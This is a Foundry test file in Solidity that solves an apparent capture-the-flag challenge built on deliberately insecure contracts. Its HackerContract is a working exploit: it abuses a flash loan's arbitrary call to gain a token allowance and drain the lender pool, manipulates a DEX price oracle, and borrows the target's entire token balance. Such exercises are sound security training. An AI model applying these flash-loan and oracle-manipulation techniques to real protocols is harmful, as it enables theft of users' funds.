// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
import {BoringToken} from "../src/tokens/tokenBoring.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
import {IInsecureDexLP} from "../src/Challenge3.borrow_system.sol";
import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {BorrowSystemInsecureOracle} from "../src/Challenge3.borrow_system.sol";


contract Challenge3Test is Test {
    // dex & oracle
    InsecureDexLP oracleDex;
    // flash loan
    InSecureumLenderPool flashLoanPool;
    // borrow system, contract target to break
    BorrowSystemInsecureOracle target;

    // insecureum token
    IERC20 token0;
    // boring token
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {

        // create the tokens
        token0 = IERC20(new InSecureumToken(30000 ether));
        token1 = IERC20(new BoringToken(20000 ether));
        
        // setup dex & oracle
        oracleDex = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(oracleDex), type(uint256).max);
        token1.approve(address(oracleDex), type(uint256).max);
        oracleDex.addLiquidity(100 ether, 100 ether);

        // setup flash loan service
        flashLoanPool = new InSecureumLenderPool(address(token0));
        // send tokens to the flashloan pool
        token0.transfer(address(flashLoanPool), 10000 ether);

        // setup the target conctract
        target = new BorrowSystemInsecureOracle(address(oracleDex), address(token0), address(token1));

        // lets fund the borrow
        token0.transfer(address(target), 10000 ether);
        token1.transfer(address(target), 10000 ether);

        vm.label(address(oracleDex), "DEX");
        vm.label(address(flashLoanPool), "FlashloanPool");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "BoringToken");

    }

    function testChallenge() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        //============================//

        HackerContract hackerContract = new HackerContract();

        hackerContract.hack(token0, token1, flashLoanPool, oracleDex, target);

        // Print player and oracle balances
        console.log("token0 player {}", token0.balanceOf(address(player)));
        console.log("token1 player {}", token1.balanceOf(address(player)));
        console.log("token0 oracle {}", token0.balanceOf(address(target)));
        console.log("token1 oracle {}", token1.balanceOf(address(target)));

        vm.stopPrank();

        assertEq(token0.balanceOf(address(target)), 0, "You should empty the target contract");

    }
}

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

contract HackerContract {
    address public owner;

    constructor() public payable {
        owner = msg.sender;
    }

    function HackFlashLoan(address token0, address our_contract) public {
        IERC20(token0).approve(our_contract, IERC20(token0).balanceOf(address(this)));
    }


    function hack(
        IERC20 token0,
        IERC20 token1,
        InSecureumLenderPool flashLoanPool,
        InsecureDexLP oracleDex,
        BorrowSystemInsecureOracle target
    ) public {
        // First we exploit the vulnerability of the FlashLoan contract
        // Using the delegate call to approve an allowance to our favor
        flashLoanPool.flashLoan(
          address(this),
          abi.encodeWithSignature("HackFlashLoan(address,address)", address(token0), address(this))
        );
        // Then we transfer to us all tokens0 from the FlashLoan contract
        token0.transferFrom(address(flashLoanPool), address(this), 10000 ether);

        /*  
            Then we're going to swap all tokens0 for tokens 1
            This way the dex used as oracle is going to be full of token0
            Taking down the price of token0 in our favor
        */
        token0.approve(address(oracleDex), 10000 ether);
        oracleDex.swap(address(token0), address(token1), 10000 ether);
        // Now we only need 4 ether amount of token1 to get all tokens0 from the target
        console.log("price:", oracleDex.calcAmountsOut(address(token0), 10000 ether));

        // Approve 4 ether of token1 and deposit into the target
        token1.approve(address(target), 4 ether);
        target.depositToken1(4 ether);
        // Make the borrow of tokens0
        target.borrowToken0(10000 ether);

        // Tranfer all tokens to the player
        token0.transfer(owner, token0.balanceOf(address(this)));
        token1.transfer(owner, token1.balanceOf(address(this)));
    }
}